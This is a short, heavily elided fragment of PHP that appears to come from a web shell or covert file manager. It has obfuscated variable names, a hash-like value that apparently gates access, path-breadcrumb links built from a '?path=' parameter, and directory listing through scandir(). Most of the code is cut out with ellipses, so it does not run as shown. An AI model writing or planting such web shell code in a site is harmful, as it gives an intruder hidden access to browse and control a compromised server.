...
$L6CRgr0 = '/x/i';
$L6CRgr1 = 'x';
$L7CRgr = '4af404ec040f3651e76439aa544920aa';
...
foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        ...
        continue;
    } echo '<a href="?path='; for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) {
            echo '/';
        }
...
<input type="submit" value="Go" />
    ...
    $scandir = scandir($path); echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
